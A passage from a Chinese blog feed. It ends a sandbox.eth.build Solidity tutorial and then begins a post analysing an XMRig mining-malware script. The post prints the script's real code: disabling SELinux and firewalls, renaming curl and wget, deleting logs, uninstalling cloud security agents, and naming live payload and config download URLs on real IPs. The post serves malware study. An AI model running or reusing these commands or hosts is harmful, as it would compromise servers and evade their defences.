href="#éƒ¨ç½²åˆçº¦" class="headerlink" title="éƒ¨ç½²åˆçº¦"></a>éƒ¨ç½²åˆçº¦</h2><ul><li><p>æŒ‰escè¿”å›åˆ°ä¸»é¡µé¢ï¼Œç‚¹å‡»deployï¼Œä½ åº”è¯¥ä¼šå‘ç°addresså‘ç”Ÿäº†æ”¹å˜ï¼Œå› ä¸ºæˆ‘ä»¬éƒ¨ç½²äº†ä¸€ä¸ªæ–°åˆçº¦ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.38.30.png"></p></li><li><p>æŸ¥çœ‹å½“å‰è®¾ç½®çš„nameå’Œownerï¼Œä½ ä¼šå‘ç°name = xiaoyue,owner = 0x000000Â·Â·Â·ã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»–ä»¬ã€‚</p></li></ul><h2 id="è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼"><a href="#è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼" class="headerlink" title="è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼"></a>è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼</h2><ul><li><p>åœ¨textä¸­å¡«å…¥æˆ‘ä»¬è‡ªå·±çš„åå­—ï¼Œæ¯”å¦‚æˆ‘çš„å¦ä¸€ä¸ªåå­—balalaã€‚ç‚¹å‡»æ—è¾¹çš„click meä¹‹åä¼šå‘ç°transactionçš„outputç«¯å£å·²ç»å°†æˆ‘ä»¬çš„äº¤æ˜“ä¿¡æ¯æ‰“å‡ºæ¥äº†ï¼Œè¿™é¢„ç¤ºç€æˆ‘ä»¬å¯èƒ½æ›´åæˆåŠŸ<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.45.14.png"></p></li><li><p>è€Œåœ¨æ—è¾¹æˆ‘ä»¬è°ƒç”¨set_ownerå‡½æ•°ï¼Œå¹¶å‘ä»–è½¬äº†0ä¸ªethã€‚è¿™æ—¶åˆçº¦ä¼šè®°å½•æˆ‘ä»¬çš„åœ°å€ï¼Œå¹¶è‡ªåŠ¨è®¾ç½®åˆ°ownerå˜é‡ä¸­ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.50.28.png"></p></li></ul><h2 id="æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name-and-owner"><a href="#æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name-and-owner" class="headerlink" title="æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name and owner"></a>æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name and owner</h2><p>æ˜¾ç„¶ï¼Œæ›´æ”¹æˆåŠŸäº†~âœ¿âœ¿ãƒ½(Â°â–½Â°)ãƒâœ¿</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.53.00.png"></p><h2 id="ä¸¤ä¸ªå°tips"><a href="#ä¸¤ä¸ªå°tips" class="headerlink" title="ä¸¤ä¸ªå°tips"></a>ä¸¤ä¸ªå°tips</h2><ol><li><p>åœ¨é‡æ–°æ‰“å¼€åˆ«äººçš„é¡¹ç›®æˆ–è€…è‡ªå·±ç»™é¡¹ç›®æ·»åŠ titleåï¼Œmoduleä¸­çš„è¿æ¥çº¿ä¼šæ–­å¼€ï¼å¦‚æœä½ å‘ç°è¿™ä¸ªğŸŒ°è¿è¡Œä¸èµ·æ¥ï¼Œä¸å¦¨æ‰“å¼€walletå’Œdeployæ¨¡å—æŸ¥çœ‹inputçš„è¿æ¥çº¿æ˜¯å¦æ–­å¼€ã€‚</p></li><li><p>é¼ æ ‡å•æœºä¸€ä¸ªç©ºç™½åœ°æ–¹ï¼ŒæŒ‰ç©ºæ ¼å°±èƒ½å¿«é€Ÿæ‰¾åˆ°ä½ è¦çš„æ¨¡å—äº†ï¼</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç¥å¥‡çš„sandbox-eth-build&quot;&gt;&lt;a href=&quot;#ç¥å¥‡çš„sandbox-eth-build&quot; class=&quot;headerlink&quot; title=&quot;ç¥å¥‡çš„sandbox.eth.build&quot;&gt;&lt;/a&gt;ç¥å¥‡çš„sandbox.eth.build&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="ethbuild" scheme="https://x1a0.net/tags/ethbuild/"/>
    
  </entry>
  
  <entry>
    <title>xmræŒ–çŸ¿è„šæœ¬åˆ†æ</title>
    <link href="https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-11-10T07:23:35.000Z</published>
    <updated>2021-11-10T07:30:15.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ"><a href="#é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ" class="headerlink" title="é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ"></a>é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ</h1><p>èµ·å› æ˜¯é˜Ÿé‡Œè€å¸ˆçš„æœåŠ¡å™¨ä¸­æ‹›äº†ï¼Œä¸è¿‡æ˜¯åœ¨dockeré‡Œé¢ï¼Œé˜¿é‡Œäº‘ç›¾çš„è¯¯æŠ¥ã€‚æƒé™ç»™çš„å°ï¼Œå°±æ²¡å»å¤„ç†ã€‚è¿™é‡Œåˆ†æä¸‹è¿™ä¸ªè„šæœ¬çš„é€»è¾‘ã€‚å¸Œæœ›å¤§å®¶å†æ¬¡ä¸­æ‹›çš„æ—¶å€™ä¸ä¼šè¿™ä¹ˆæ‡µã€‚</p><p>è¿™ä¸ªæŒ–çŸ¿è„šæœ¬æ˜æ˜¾æ˜¯é€šè¿‡ä¹‹å‰çš„å‡ ä¸ªç‰ˆæœ¬çš„ç—…æ¯’é­”æ”¹çš„ï¼Œè¿˜æ˜¯Redisæœªæˆæƒæ¼æ´ã€‚ç—…æ¯’ä¼šé€šè¿‡æ„ŸæŸ“ä¸»æœºè®¾ç½®äº†å…å¯†ç™»å½•çš„å…¶ä»–ä¸»æœºï¼Œå¹¶è¿›è¡ŒRedisæ•°æ®åº“æœªæˆæƒè®¿é—®æ¼æ´çš„æ‰«æã€‚</p><p>å› ä¸ºæœ€è¿‘æ¯”èµ›å¾ˆå¤šï¼Œæœ‰ç©ºå†å†™å¤„ç½®æ–¹æ³•ã€‚å“ˆå“ˆï¼Œé¸½é¸½ã€‚</p><hr><p>è·å–å½“å‰ipåœ°å€ä¿¡æ¯<br>sedå…¨å±€æ›¿æ¢(/g)å°†â€,â€æ›¿æ¢ä¸ºâ€\nâ€<br>grepä¸åŒºåˆ†å¤§å°å†™åˆ¤æ–­æ˜¯å¦å«æœ‰CN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> curl http://ip-api.com/json/ | sed <span class="string">&#x27;s/,/\n/g&#x27;</span> | grep  -i <span class="string">&#x27;CN&#x27;</span>; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">exit</span> 1 </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Linuxä¸‹çš„å®‰å…¨å­ç³»ç»Ÿå…³é—­ï¼Œå¹¶ä¸”å°†é”™è¯¯è¾“å‡ºåˆ°é»‘æ´</p><p><a href="https://baike.baidu.com/item/SELinux/8865268?fr=aladdin">Selinux</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¸…ç†ç¼“å­˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/dro</span><br></pre></td></tr></table></figure><p>æ›´æ”¹äº†ä¸€äº›ç³»ç»Ÿå‘½ä»¤åç§°ï¼Œå®šä¹‰äº†ä¸€äº›å˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">crondir=<span class="string">&#x27;/var/spool/cron/&#x27;</span><span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">cont=`cat <span class="variable">$&#123;crondir&#125;</span>`</span><br><span class="line">ssht=`cat /root/.ssh/authorized_keys`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /etc/zzhs</span><br><span class="line">rtdir=<span class="string">&quot;/etc/zzhs&quot;</span></span><br><span class="line">bbdir=<span class="string">&quot;/usr/bin/curl&quot;</span></span><br><span class="line">bbdira=<span class="string">&quot;/usr/bin/cd1&quot;</span></span><br><span class="line">ccdir=<span class="string">&quot;/usr/bin/wget&quot;</span></span><br><span class="line">ccdira=<span class="string">&quot;/usr/bin/wd1&quot;</span></span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æœ€å¤§æ–‡ä»¶é™åˆ¶æ•°</p><p>åˆ é™¤æ—¥å¿—æ–‡ä»¶</p><p>ç»™ç›®å½•ä¸Šé”</p><p>å…³é—­é˜²ç«å¢™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">rm -rf /var/<span class="built_in">log</span>/syslog</span><br><span class="line">chattr -iua /tmp/</span><br><span class="line">chattr -iua /var/tmp/</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…³é—­ç³»ç»Ÿç›‘è§†</p><p>åˆ æ‰äº†ä¸¤ä¸ªè´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo sysctl kernel.nmi_watchdog=0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0&#x27;</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;kernel.nmi_watchdog=0&#x27;</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">userdel akay</span><br><span class="line">userdel vfinder</span><br><span class="line">rm -rf /tmp/addres*</span><br><span class="line">rm -rf /tmp/walle*</span><br><span class="line">rm -rf /tmp/keys</span><br></pre></td></tr></table></figure><p>å¸è½½é˜¿é‡Œäº‘ç›¾å’Œè…¾è®¯çš„äº‘é•œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">&#x27;[a]liyun&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">&#x27;[y]unjing&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰è¿œç¨‹æ–‡ä»¶åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">miner_url=<span class="string">&quot;http://106.15.74.113/b2f628/zzh&quot;</span></span><br><span class="line">miner_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/zzh&quot;</span></span><br><span class="line">miner_size=<span class="string">&quot;7600464&quot;</span></span><br><span class="line">sh_url=<span class="string">&quot;https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexni.png&quot;</span></span><br><span class="line">sh_url_backup=<span class="string">&quot;https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexni.png&quot;</span></span><br><span class="line">config_url=<span class="string">&quot;http://106.15.74.113/b2f628/config.json&quot;</span></span><br><span class="line">config_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/config.json&quot;</span></span><br><span class="line">config_size=<span class="string">&quot;2752&quot;</span></span><br><span class="line">chattr_size=<span class="string">&quot;8000&quot;</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br><span class="line"><span class="built_in">echo</span> 128 &gt; /proc/sys/vm/nr_hugepages</span><br><span class="line">sysctl -w vm.nr_hugepages=128</span><br></pre></td></tr></table></figure><p>åˆ é™¤åŒç±»æŒ–çŸ¿ç—…æ¯’ï¼Œå¾ˆé•¿ï¼Œçœç•¥äº†äº›ã€‚</p><p>éœ€è¦ç—…æ¯’æ ·æœ¬ç ”ç©¶çš„å¯ä»¥ä»è¿™æ‹¿ï¼š<a href="https://github.com/xiaoyue2019/Xmrig-mining-virus-samples">https://github.com/xiaoyue2019/Xmrig-mining-virus-samples</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">kill_miner_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">netstat -anp | grep 185.71.65.238 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep 140.82.52.87 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :23 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :143 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :2222 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3333 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3389 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :5555 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6666 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6665 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6667 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :7777 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :8444 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3347 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:3333&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:5555&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kworker -c\&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;log_&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;systemten&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;voltuned&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;darwin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/dl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/pprt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ppol&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/65ccE*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/jmx*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/2Ne80*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;IOFoqIgyC0zmf2UR&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;45.76.122.92&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.191.178&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.15.56.161&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;86s.jpg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aGTSGJJp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nMrfmnRa&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;PuNY5tm2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;I0r8Jyyt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AgdgACUD&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;uiZvwxG8&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;BtwXn5qH&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3XEzey2T&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;t2tKrCSZ&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span 